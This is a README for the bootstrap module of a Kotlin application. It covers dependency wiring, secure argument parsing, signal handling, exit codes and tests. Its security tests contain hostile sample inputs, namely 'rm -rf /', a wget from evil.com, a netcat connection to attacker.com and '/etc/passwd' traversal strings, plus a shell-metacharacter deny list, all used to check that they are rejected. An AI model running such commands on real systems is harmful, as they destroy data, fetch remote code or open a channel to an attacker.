# Bootstrap Module

**Version:** 1.0.0  
**Date:** January 2025  
**License:** BSD-3-Clause  
**Copyright:** © 2025 Michael Gardner, A Bit of Help, Inc.  
**Authors:** Michael Gardner  
**Status:** Released

## What is the Bootstrap Module?

The bootstrap module is your application's "startup crew" - it gets everything ready, wires all the components together, and starts the show. Think of it as the backstage coordinator that makes sure all the actors (modules) are in their proper places before the curtain goes up.

## Why Bootstrapping Matters

Without proper bootstrapping, you'd have:
- Scattered configuration logic
- Manual dependency wiring everywhere
- No clear application entry point
- Poor error handling at startup
- Inconsistent resource cleanup

The bootstrap module solves all these problems in one place.

## Core Responsibilities

### 1. Application Entry Point
```kotlin
// Simple synchronous entry
fun main(args: Array<String>) {
    val exitCode = App.run(args)
    exitProcess(exitCode)
}

// Async entry with signal handling
suspend fun main(args: Array<String>) {
    val exitCode = AsyncApp.runAsync(args)
    exitProcess(exitCode)
}
```

### 2. Dependency Composition
The "Composition Root" pattern - all dependencies wired in one place:

```kotlin
object CompositionRoot {
    suspend fun buildAndRunAsync(config: AppConfig): Int {
        // 1. Build infrastructure layer
        val greetingService: GreetingService = DefaultGreetingService()
        val outputPort: OutputPort = when {
            config.outputPath != null -> CompositeOutputAdapter.createWithFile(
                ConsoleOutputAdapter(),
                FileOutputAdapter(config.outputPath!!)
            )
            else -> ConsoleOutputAdapter()
        }
        
        // 2. Build application layer
        val createGreetingUseCase: CreateGreetingInputPort = 
            CreateGreetingUseCase(greetingService, outputPort)
        
        // 3. Build presentation layer
        val cli = CliFactory.createAsyncCli(createGreetingUseCase)
        
        // 4. Run the application
        return cli.run(config.args)
    }
}
```

**Key Pattern**: Dependencies flow inward - outer layers depend on inner layers, never the reverse.

### 3. Configuration Management

```kotlin
data class AppConfig(
    val name: String? = null,
    val outputPath: String? = null,
    val verbose: Boolean = false,
    val args: Array<String> = emptyArray()
) {
    companion object {
        fun fromArgs(args: Array<String>): Either<ConfigError, AppConfig> {
            return SecureArgParser.parseSecure(args)
                .mapLeft { ConfigError.InvalidArguments(it.message) }
        }
    }
}
```

### 4. Security-First Argument Parsing

Our `SecureArgParser` protects against common attack vectors:

```kotlin
object SecureArgParser {
    fun parseSecure(args: Array<String>): Either<SecurityError, AppConfig> {
        // 1. Length validation
        args.forEach { arg ->
            if (arg.length > MAX_ARG_LENGTH) {
                return SecurityError.ExcessiveLength(arg.length).left()
            }
        }
        
        // 2. Character validation
        args.forEach { arg ->
            if (containsDangerousPatterns(arg)) {
                return SecurityError.DangerousCharacters(arg).left()
            }
        }
        
        // 3. Path sanitization
        val sanitizedArgs = args.map { sanitizePath(it) }
        
        // 4. Parse into config
        return parseValidatedArgs(sanitizedArgs)
    }
    
    private fun containsDangerousPatterns(input: String): Boolean {
        val dangerousPatterns = listOf(
            "..",       // Path traversal
            "~",        // Home directory expansion
            "$",        // Variable expansion
            "`",        // Command substitution
            ";", "&",   // Command separators
            "|",        // Pipes
            ">", "<",   // Redirects
            "\n", "\r"  // Line injection
        )
        
        return dangerousPatterns.any { pattern ->
            input.contains(pattern)
        }
    }
}
```

**Security Features:**
- Length limits prevent DoS attacks
- Character filtering blocks injection
- Path sanitization prevents traversal
- System directory protection

## Signal Handling for Graceful Shutdown

Our async application handles system signals properly:

```kotlin
object AsyncApp {
    suspend fun runAsync(args: Array<String>): Int {
        // Install signal handlers
        val shutdownChannel = Channel<String>()
        
        val signalHandler = { signal: String ->
            runBlocking {
                shutdownChannel.send(signal)
            }
        }
        
        // Handle SIGTERM, SIGINT, SIGHUP
        setupSignalHandlers(signalHandler)
        
        try {
            // Parse configuration
            val config = SecureArgParser.parseSecure(args).fold(
                { error -> 
                    System.err.println("Configuration error: ${error.message}")
                    return INVALID_ARGUMENTS_EXIT_CODE
                },
                { it }
            )
            
            // Start application with timeout
            return withTimeoutOrNull(STARTUP_TIMEOUT) {
                select {
                    // Run the application
                    async { CompositionRoot.buildAndRunAsync(config) }
                        .onAwait { result -> result }
                    
                    // Listen for shutdown signals
                    shutdownChannel.onReceive { signal ->
                        println("Received signal: $signal")
                        SIGNAL_EXIT_CODE
                    }
                }
            } ?: TIMEOUT_EXIT_CODE
            
        } catch (e: Exception) {
            System.err.println("Unexpected error: ${e.message}")
            return GENERAL_ERROR_EXIT_CODE
        }
    }
}
```

## Exit Code Strategy

Following Unix conventions for consistent behavior:

```kotlin
object ExitCodes {
    const val SUCCESS = 0                    // Everything worked
    const val GENERAL_ERROR = 1             // Something went wrong
    const val UNCAUGHT_EXCEPTION = 2        // Unhandled exception
    const val INVALID_STATE = 3             // Application in bad state
    const val INVALID_ARGUMENTS = 4         // Bad command line args
    const val PERMISSION_DENIED = 126       // Can't execute
    const val INTERRUPTED = 130             // SIGINT (Ctrl+C)
    const val STACK_OVERFLOW = 134          // Stack overflow
    const val OUT_OF_MEMORY = 137           // OOM condition
}
```

**Usage in scripts:**
```bash
#!/bin/bash
./my-app Alice
if [ $? -eq 0 ]; then
    echo "Success!"
elif [ $? -eq 4 ]; then
    echo "Invalid arguments provided"
else
    echo "Application failed with code $?"
fi
```

## Real-World Usage Examples

### Basic Command Line Usage

```bash
# Simple greeting
./gradlew :bootstrap:run --args="Alice"

# With file output
./gradlew :bootstrap:run --args="Bob --out=greetings.txt"

# Verbose mode
./gradlew :bootstrap:run --args="--verbose Charlie"

# Help
./gradlew :bootstrap:run --args="--help"
```

### Programmatic Usage

```kotlin
// Custom application entry
class MyCustomApp {
    suspend fun start(userConfig: UserConfig) {
        val appConfig = AppConfig(
            name = userConfig.username,
            outputPath = userConfig.logFile,
            verbose = userConfig.debugMode
        )
        
        val exitCode = CompositionRoot.buildAndRunAsync(appConfig)
        
        when (exitCode) {
            ExitCodes.SUCCESS -> logger.info("Application completed successfully")
            ExitCodes.INVALID_ARGUMENTS -> logger.error("Invalid configuration provided")
            else -> logger.error("Application failed with code $exitCode")
        }
    }
}
```

## Testing Strategies

### Configuration Testing

```kotlin
class AppConfigTest : DescribeSpec({
    
    describe("AppConfig creation") {
        it("should parse valid arguments") {
            val args = arrayOf("Alice", "--out=output.txt", "--verbose")
            
            val result = AppConfig.fromArgs(args)
            
            result.shouldBeRight()
            val config = result.value
            config.name shouldBe "Alice"
            config.outputPath shouldBe "output.txt"
            config.verbose shouldBe true
        }
        
        it("should reject dangerous arguments") {
            val args = arrayOf("../../../etc/passwd")
            
            val result = AppConfig.fromArgs(args)
            
            result.shouldBeLeft()
        }
    }
})
```

### Security Testing

```kotlin
class SecureArgParserTest : DescribeSpec({
    
    describe("Security validation") {
        it("should block command injection attempts") {
            val maliciousArgs = arrayOf(
                "user; rm -rf /",
                "user & wget evil.com/script.sh",
                "user | nc attacker.com 4444"
            )
            
            maliciousArgs.forEach { arg ->
                val result = SecureArgParser.parseSecure(arrayOf(arg))
                result.shouldBeLeft()
            }
        }
        
        it("should prevent path traversal") {
            val traversalArgs = arrayOf(
                "../../../etc/passwd",
                "~/secret-file",
                "..\\..\\windows\\system32"
            )
            
            traversalArgs.forEach { arg ->
                val result = SecureArgParser.parseSecure(arrayOf(arg))
                result.shouldBeLeft()
            }
        }
    }
})
```

### Integration Testing

```kotlin
class AsyncAppTest : DescribeSpec({
    
    describe("Full application startup") {
        it("should start and stop gracefully") {
            val testOutput = createTempFile()
            val args = arrayOf("TestUser", "--out=${testOutput.absolutePath}")
            
            val exitCode = runBlocking {
                withTimeout(5000) {
                    AsyncApp.runAsync(args)
                }
            }
            
            exitCode shouldBe ExitCodes.SUCCESS
            testOutput.readText() shouldContain "Hello, TestUser!"
        }
        
        it("should handle invalid arguments") {
            val args = arrayOf("--invalid-flag")
            
            val exitCode = runBlocking {
                AsyncApp.runAsync(args)
            }
            
            exitCode shouldBe ExitCodes.INVALID_ARGUMENTS
        }
    }
})
```

## Environment-Specific Configuration

### Development Environment

```kotlin
object DevelopmentConfig {
    fun create(): AppConfig = AppConfig(
        verbose = true,
        outputPath = "dev-output.txt"
    )
}
```

### Production Environment

```kotlin
object ProductionConfig {
    fun create(): AppConfig = AppConfig(
        verbose = false,
        outputPath = System.getenv("APP_OUTPUT_PATH")
    )
}
```

### Docker Environment

```dockerfile
# Dockerfile
FROM openjdk:21-jre-slim

COPY app.jar /app/
WORKDIR /app

# Handle signals properly in containers
ENTRYPOINT ["java", "-jar", "app.jar"]

# Signal handling requires these
STOPSIGNAL SIGTERM
```

## Error Handling Patterns

### Startup Errors

```kotlin
sealed class StartupError {
    data class ConfigurationError(val message: String) : StartupError()
    data class DependencyError(val dependency: String) : StartupError()
    data class ResourceError(val resource: String) : StartupError()
}

fun handleStartupError(error: StartupError): Int {
    return when (error) {
        is StartupError.ConfigurationError -> {
            System.err.println("Configuration error: ${error.message}")
            ExitCodes.INVALID_ARGUMENTS
        }
        is StartupError.DependencyError -> {
            System.err.println("Failed to initialize ${error.dependency}")
            ExitCodes.GENERAL_ERROR
        }
        is StartupError.ResourceError -> {
            System.err.println("Cannot access ${error.resource}")
            ExitCodes.PERMISSION_DENIED
        }
    }
}
```

### Resource Cleanup

```kotlin
class ResourceManager {
    private val resources = mutableListOf<Closeable>()
    
    fun <T : Closeable> register(resource: T): T {
        resources.add(resource)
        return resource
    }
    
    fun cleanup() {
        resources.reversed().forEach { resource ->
            try {
                resource.close()
            } catch (e: Exception) {
                System.err.println("Error closing resource: ${e.message}")
            }
        }
        resources.clear()
    }
}
```

## Module Structure

```
bootstrap/
├── src/
│   ├── main/
│   │   └── kotlin/
│   │       └── com/abitofhelp/hybrid/bootstrap/
│   │           ├── App.kt               # Legacy sync entry point
│   │           ├── AsyncApp.kt          # Modern async entry point
│   │           ├── AppConfig.kt         # Configuration data class
│   │           ├── CompositionRoot.kt   # Dependency wiring
│   │           ├── EntryPoint.kt        # Simple main function
│   │           ├── ExitCodes.kt         # Exit code constants
│   │           └── SecureArgParser.kt   # Security-focused arg parsing
│   └── test/
│       └── kotlin/
│           └── com/abitofhelp/hybrid/bootstrap/
│               ├── AppConfigTest.kt     # Configuration tests
│               ├── AsyncAppTest.kt      # Integration tests
│               └── SecureArgParserTest.kt # Security tests
└── build.gradle.kts
```

## Performance Considerations

### Startup Time Optimization

```kotlin
object FastStartup {
    suspend fun optimizedStartup(config: AppConfig): Int {
        // Parallel initialization
        return coroutineScope {
            val infraDeferred = async { initializeInfrastructure(config) }
            val domainDeferred = async { initializeDomain() }
            val appDeferred = async { initializeApplication() }
            
            // Wait for all to complete
            val infra = infraDeferred.await()
            val domain = domainDeferred.await()
            val app = appDeferred.await()
            
            // Wire together and run
            runApplication(infra, domain, app, config)
        }
    }
}
```

### Memory Management

```kotlin
class MemoryAwareBootstrap {
    fun checkMemoryRequirements(): Either<StartupError, Unit> {
        val runtime = Runtime.getRuntime()
        val maxMemory = runtime.maxMemory()
        val requiredMemory = 64 * 1024 * 1024 // 64MB minimum
        
        return if (maxMemory < requiredMemory) {
            StartupError.ResourceError(
                "Insufficient memory: ${maxMemory / 1024 / 1024}MB available, " +
                "${requiredMemory / 1024 / 1024}MB required"
            ).left()
        } else {
            Unit.right()
        }
    }
}
```

## Best Practices Checklist

### ✅ DO:
- Validate all external input immediately
- Use dependency injection at the composition root
- Handle signals for graceful shutdown
- Return appropriate exit codes
- Clean up resources on shutdown
- Log startup and shutdown events
- Make configuration explicit and testable

### ❌ DON'T:
- Scatter dependency creation throughout the app
- Ignore security concerns in argument parsing
- Use hard-coded configuration values
- Skip error handling in startup code
- Let exceptions crash the application ungracefully
- Mix business logic with bootstrap logic

## Troubleshooting

### Problem: "Application won't start"
**Check:**
1. Arguments are valid and safe
2. Required directories exist
3. Permissions are correct
4. Memory requirements met

### Problem: "Graceful shutdown not working"
**Check:**
1. Signal handlers installed correctly
2. Platform supports the signals
3. Container/runtime forwards signals
4. Timeout values appropriate

### Problem: "Security validation too strict"
**Solution:**
1. Review validation rules
2. Add legitimate use cases to whitelist
3. Provide clear error messages
4. Consider configuration options

## Summary

The bootstrap module is your application's foundation. It should:

- **Start** your application reliably and securely
- **Wire** all dependencies in one place
- **Validate** all external input thoroughly
- **Handle** shutdown gracefully
- **Report** status clearly through exit codes

Remember: A well-designed bootstrap module makes the difference between a professional application and a fragile script!